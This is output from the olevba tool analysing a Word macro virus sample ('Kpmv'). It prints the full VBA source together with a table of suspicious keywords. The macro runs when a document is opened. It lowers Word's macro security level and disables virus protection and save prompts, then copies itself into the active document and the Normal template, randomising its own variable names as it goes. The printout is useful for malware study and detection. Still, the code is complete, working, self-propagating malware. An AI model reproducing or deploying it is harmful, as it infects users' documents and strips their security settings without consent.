olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kpmv-d5fab40bbb4c64668371ae47eca8086b45cea88475cf6562961b0195b1f084f9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kpmv-d5fab40bbb4c64668371ae47eca8086b45cea88475cf6562961b0195b1f084f9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next
Q6 = mz89n7G3Q6h + H6V1h + A4G6g + C1V3f + N5F1j + D0O8x + O9O7l + N5J1i + T1A5o + O2J3k + V3C4j + U4
Dim sg53f8(27) As String: sg53f8(0) = "xt44d6": sg53f8(1) = "do20k3": sg53f8(2) = "rb54k8": sg53f8(3) = "cm69x5": sg53f8(4) = "pe15y0": sg53f8(5) = "iq16r7": sg53f8(6) = "cm69x5": sg53f8(7) = "gx95x9": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
K1 = T5N6j + C7D8u + U6I7u + N8G5p + T7M3o + T4K2f + F1E9h + A6I7j + K4F1e + P7C0v + T6N0m + R5
sg53f8(8) = "ae93l1": sg53f8(9) = "kw84h7": sg53f8(10) = "xp10k3": sg53f8(11) = "ju23t9": sg53f8(12) = "hf17k5": sg53f8(13) = "jl90i5": sg53f8(14) = "fh74p7": sg53f8(15) = "yp46c1": Options.VirusProtection = False
C8 = C8G3z + R3H6m + R3L8o + G6R1n + B4U5u + F8C1w + R6R2z + D2
sg53f8(16) = "fe43z8": sg53f8(17) = "xp62l6": sg53f8(18) = "zc46u5": sg53f8(19) = "qb32m8": sg53f8(20) = "xf17j6": sg53f8(21) = "nn28o1": sg53f8(22) = "sg53f8": sg53f8(23) = "io54n3": Options.SaveNormalPrompt = False
L5 = H0B4n + Q1E1t + B1N4l + E4
sg53f8(24) = "ei67r5": sg53f8(25) = "rc79w1": sg53f8(26) = "xn49c8": sg53f8(27) = "mz89n7": Options.ConfirmConversions = False
V4 = O3M8p + S9B3x + P6V4r + A0O1u + M1R5x + F9
Set xt44d6 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
T3 = N3T3s + R5O6v + L6I6t + D5S1o + N6D6i + T2D1s + L7H2y + D4
Set do20k3 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
L7 = U1V8q + B5B0z + C5A0n + P6R2p + I8
Set rb54k8 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
K3 = L9K7g + Q8B3m + S1A8g + G7
pe15y0 = "private sub" & " document_open()": iq16r7 = "end" & " sub"
J7 = G4K3h + P4O4i + G7R4p + M1
cm69x5 = rb54k8.Lines(1, rb54k8.CountOfLines)
H7 = I1A7e + V0S3w + B4B6w + Q2I3v + M4T6l + G3H7y + S7Q5q + Q3
gx95x9 = InStr(LCase(cm69x5), pe15y0)
M2 = A8H4o + V7I1x + V3U2h + A0K8t + S4H9p + U2V2t + J8P6r + F7U6r + U0S3m + E8C1l + U1S6o + Q7
ae93l1 = InStr(gx95x9, LCase(cm69x5), iq16r7) + Len(iq16r7)
C7 = B3Q3s + R5R8x + A8O7s + E7D8j + R2H3j + J9S2v + C4T4j + S0T3x + N7H8k + I4J3r + M9N9t + H1
kw84h7 = Mid(cm69x5, gx95x9, ae93l1 - gx95x9)
I2 = J9P0u + O1N2k + B2Q9q + D2
If xt44d6.CountOfLines <> 0 Then
M3 = S6Q2o + V4C7m + T6J7k + A7L3n + H1E9r + N7D0k + A1O4x + O0F8g + C6D5s + Q1
xp10k3 = xt44d6.Lines(1, xt44d6.CountOfLines)
S0 = K6I9l + U7P5f + U8L6f + S8T1v + E4P2r + F2L7n + I6N8w + J6M8k + A7H1m + S7T7s + A5
If InStr(xp10k3, "(27) As String") = 0 Then
L1 = B0N1j + D2M7z + O3
If InStr(LCase(xp10k3), pe15y0) <> 0 Then
T5 = N5A2z + A5E2f + N8H2m + Q8C9j + P2M5x + A7E8k + C1J2k + B3U2s + J4
ju23t9 = False
M8 = N4T6v + D8G3n + O8G2x + H9T2l + G8U8u + G3K0e + H1A7p + C5T7l + F3L0q + Q9F5o + K4
For hf17k5 = 1 To xt44d6.CountOfLines: DoEvents
L8 = F1I2j + L9O9i + F2I5l + T3G6w + I4G1p + S3D4k + B6A3f + O6
If ju23t9 = False Then
P3 = S8P8t + Q1I0s + J5J3g + D1J2u + O4P4t + P5V1o + N6A4g + D4P5k + Q1F7q + P7V7t + I3G7n + P1
If LCase(xt44d6.Lines(hf17k5, 1)) = pe15y0 Then
V5 = T4C7x + G5O5i + E7V6h + B4T7x + O2Q7o + U8P8h + H2E3u + V1R6z + D3M1f + T4G9z + Q7U7i + B0
ju23t9 = True
J2 = R6S3n + P7E7g + B2A0z + C1S4u + F4U5h + A0P3i + T5O8t + B2
jl90i5 = hf17k5
K6 = P8H3k + O4Q5h + A1T4k + I8V0s + K4H8l + N9I6y + N9
End If
O6 = H2F4h + H6P0u + T5L6r + V8Q9r + B6
Else
D2 = Q3Q2p + K2E4g + A6N1u + F2J6v + E7E9s + D6F6f + R7
If LCase(xt44d6.Lines(hf17k5, 1)) = iq16r7 Then
K7 = E8H5w + V3D5s + C2S7x + H3I9m + E2N8m + C9P9q + I7V7p + C1P2s + J1
fh74p7 = hf17k5
P6 = F3N8w + P1K2r + U4H1m + C3S1z + A5
Exit For
Q2 = H5L4q + B8M7z + A9Q9f + L2A2e + G0D5m + K5H2n + A3A3r + N8M5y + M6G5e + F2N5u + G7S5z + J4
End If
N6 = D3V3q + B5G3o + U3E5i + F6T2m + R7A5o + E0K0f + S9C4k + A2T7m + Q2N6k + F5
End If
H1 = S3I7v + C7I2j + A8Q6z + C8I5m + D7E9i + G1G1q + F1
Next
E6 = E6E6q + Q3N0n + A9T2h + V5G4z + H2J3g + P9L8p + L1P4u + U1U5v + L3A4h + O3R2e + O7F8r + B4
xt44d6.DeleteLines jl90i5, fh74p7 - (jl90i5 - 1)
J7 = G0G7o + V7N4m + B4G1l + M9M8q + B4V6i + M3V4r + L8Q7p + R5
End If
G4 = E8D3v + L0T3t + P3
Set yp46c1 = xt44d6
R7 = J3I6u + O4U7i + L3D6j + D6B4z + J4H2z + J1F1p + V8
xt44d6.addfromstring kw84h7: If ActiveDocument.Saved = False Then ActiveDocument.Save
O5 = M4D6t + A2A0o + F5T8j + J4I8w + A7M4x + B3
End If
T6 = H0C5w + H0G7y + S3M0x + N1O4j + R5T1k + H4M2n + O5U1l + S3
Else
E0 = G8V1h + N8I3w + B3V3f + H7
Set yp46c1 = xt44d6
M7 = I6S2l + F4Q4f + J1
xt44d6.addfromstring kw84h7: If ActiveDocument.Saved = False Then ActiveDocument.Save
J0 = C7M4l + L1A8y + D1O2h + H2I6j + B3D5h + P3N0y + D4U6s + J8U0g + B5C2m + U3
End If
S2 = K8Q7e + N2S9n + O2R8x + F3M2z + B4C8k + B6F6r + G6S2w + I8R8q + A1B6l + F2
If do20k3.CountOfLines <> 0 Then
N1 = F1J3s + S4M3e + V4H1x + V7R6o + L7N3l + S6
fe43z8 = do20k3.Lines(1, do20k3.CountOfLines)
M6 = G8D3j + C1O5v + T1C7m + I5L4f + T4L3o + M5C3y + L4D0l + L9P1r + F8
If InStr(fe43z8, "(27) As String") = 0 Then
G1 = I1C8z + K9Q1h + V5K5f + R4P5g + K7N3w + Q5T1w + K8N5z + C8L7o + N1L2h + H3M8l + P7
If InStr(LCase(fe43z8), pe15y0) <> 0 Then
I0 = K9D7x + C4I2y + P2T1o + J6U4x + D2T3q + T9I7y + O6K2k + T2O8l + H9
ju23t9 = False
D8 = Q2P8m + U3N2y + I4R8i + P4E2x + D8R1g + G6C6e + K6
For hf17k5 = 1 To do20k3.CountOfLines: DoEvents
U0 = G0M2g + N3E8k + E8
If ju23t9 = False Then
I8 = G3O3p + V2G7u + E4
If LCase(do20k3.Lines(hf17k5, 1)) = pe15y0 Then
H9 = T5R0v + Q8J8z + E0Q4t + F1M5u + D1U9n + L5P1k + L4M6f + O8N7o + Q8N7z + I9
ju23t9 = True
I3 = D0U6l + C2B5s + I2O0x + K4N6r + R3O2z + U7B1s + H7F1t + T0H1f + B0C8y + A4M4p + H9E7y + K1
jl90i5 = hf17k5
U6 = H5U1k + D7K4w + T5
End If
L5 = K1G2g + V1H1p + O2U1z + M1V7m + N5L8t + O3B6i + J7T6e + M9
Else
R1 = A2G4g + T1L3h + L3J1x + R2P8x + L4I4e + E5H5p + P6G0i + C4E3z + H8B2u + P5
If LCase(do20k3.Lines(hf17k5, 1)) = iq16r7 Then
U6 = D1Q7l + A3J9l + Q7J2u + K3J1n + Q3
fh74p7 = hf17k5
M7 = V7A1g + U8A4v + J6Q4y + B3F7j + V0V6m + P5H6f + A5P0u + E5D6q + O4
Exit For
F1 = K9V5v + H6U6p + U4Q6h + P7
End If
E6 = N4E2m + G3S5r + K5M9u + H8
End If
S5 = B0V6w + G6C9h + M2C3r + K2K7k + S6F9h + C4
Next
O1 = V8D5l + R5V2m + U7
do20k3.DeleteLines jl90i5, fh74p7 - (jl90i5 - 1)
Q5 = E7G2u + J3N3o + J9A5l + D4
End If
P4 = C4E0w + F8N8p + I4N6g + E1T9y + C7K4l + B1U9z + O1Q5v + A9
Set yp46c1 = do20k3
A7 = I2H5u + K8A2t + F7J3k + R2S1y + P6
do20k3.addfromstring kw84h7: If NormalTemplate.Saved = False Then NormalTemplate.Save
U6 = V3J9w + T2K6j + B7
End If
C3 = U4N4f + Q7J5x + S6C7f + C8O8q + U7T8q + S4V8u + F6
Else
O8 = S5U2w + F2P1y + A7S8f + J5Q2v + N1
Set yp46c1 = do20k3
A5 = S7B1h + K2G5i + B0R4u + R4S7i + R4V9j + F7G1j + I5
do20k3.addfromstring kw84h7: If NormalTemplate.Saved = False Then NormalTemplate.Save
L6 = F0M2r + Q7F3v + I3R5g + G1L5i + A6T5y + B2C5h + P4
End If
R6 = T7E3u + R1L3s + O7K5m + V1D2q + M2F5t + U5Q0j + N4I4o + C7
If yp46c1 <> "" Then
M1 = E5J4z + B0B2i + G6F5o + M2E8y + K2M3s + M3E2f + B6
Dim xp62l6 As Long, zc46u5 As Long, qb32m8 As Long, xf17j6 As Long
E6 = P5C7j + R5B7u + O1A3i + J7
For nn28o1 = 0 To UBound(sg53f8): DoEvents
J2 = K3P8w + J8D1s + R5F0v + C3H5i + V4L1n + I4Q2o + V6S2w + C6N9t + B1B5k + O0T1h + P4C5h + J1
Randomize: io54n3 = Chr(97 + (Rnd * 25)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)) & Chr(48 + (Rnd * 9)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)): DoEvents
U7 = K8C7e + V3I6j + L7R3x + A7R2k + V2M5i + T1N2r + O2A0o + V4P0m + Q7M1i + S6E3m + C8Q4x + V4
xp62l6 = 1: zc46u5 = 1
S5 = N0T2s + S8D9s + B7
With yp46c1
F6 = F2S6k + A7V4m + J5S7h + O8P6y + S7E6p + K2J1q + B9U0g + R4U3p + R4C5r + I6
Do While .Find(sg53f8(nn28o1), xp62l6, zc46u5, qb32m8, xf17j6, True)
B2 = B4L1y + F9P7z + Q7I8g + C9Q7e + H1O1q + Q2R7w + E1
ei67r5 = .Lines(qb32m8, 1)
U5 = L6R0u + O4D5s + S0O8e + P7M1u + V1F7y + M2I1e + T5
rc79w1 = Mid(ei67r5, 1, zc46u5 - 1) & io54n3 & Mid(ei67r5, xf17j6)
L8 = N4K9w + R6F3y + L6V2w + C6J7r + N7Q3l + T3Q7v + U8
.replaceline qb32m8, rc79w1: DoEvents
P5 = T3Q1y + T2N5t + A5O6g + C6N6q + P7J8s + L7V5y + L0C4j + Q0P8p + S2N5j + J4T4e + G5B9k + G0
xp62l6 = qb32m8
S8 = F7I0t + J7D7q + I2N3h + V1J9z + A5O3z + P3V9y + M5L3o + G4U4f + H2
qb32m8 = .CountOfLines: zc46u5 = 1
A1 = H8H0h + A9U0r + U8V7e + V3M7k + B5
Loop
F8 = R4U5s + T3M8w + J9G3u + L2
End With
B4 = T1J0p + D9P7o + U2J3s + M3I4h + H8
Next
R3 = Q6I5e + V0F4v + D8Q4m + U9
With yp46c1
J0 = I1K8z + C4K1m + S1K0e + M7U5n + I5B9u + M1F5w + B8U6z + G6
For xn49c8 = 2 To (.CountOfLines - 1) Step 2: DoEvents
S7 = O2E8n + B3H5t + I3Q8m + H8
For mz89n7 = 1 To (Int(Rnd * 10) + 2): DoEvents
V2 = V4P3p + T7A4n + A8C8r + G2R5u + N8Q6o + F1
Randomize: io54n3 = io54n3 + (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(122 - Int(Rnd * 22))) & " + ": DoEvents
A8 = O1S4j + C7R2v + M4H7j + J7V5o + U8G1i + U9C2j + S0K6y + E4G8v + E3D3q + H6E4z + J6D4n + V6
Next mz89n7
A6 = S8L3v + S1O2g + B1E7m + D3D3g + K1F8o + N6N7h + S8
Randomize: .replaceline xn49c8, (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & " = " & io54n3 & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)): DoEvents
H1 = M8U8q + Q8P6n + P3D2e + A8R5n + B2A8n + A3L7v + T6A1l + N5K2y + D9T0q + O8T8e + K8
io54n3 = "": DoEvents
V7 = F9L5x + A9G7w + B6S5l + T1O5h + V9H7l + K5B3k + G4G2k + E9
Next xn49c8
I0 = F5K7e + V8D3h + N8C4s + C1B8l + M8V2g + R2S1x + F4K4x + N5L6p + K6E7o + D1F1x + T7E9q + L2
End With
J9 = J2R8k + H3R2y + T1L3f + K6A5m + J4Q5p + C9C5j + K8
End If
R1 = N9U5t + A1J3e + U3R4z + P5
'KPMV Word 2000 Macro Virus - By [K] - Virii Argentina - http://www.virii.com.ar
N0 = I7L5k + O5L5z + B7V0q + Q7N4v + T9H7x + C7
'February 2001 - Buenos Aires - Argentina
F1 = L4Q5z + P1T7k + V5T2u + T6F6n + A8
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.virii.com|URL                                          |
|          |.ar                 |                                             |
+----------+--------------------+---------------------------------------------+

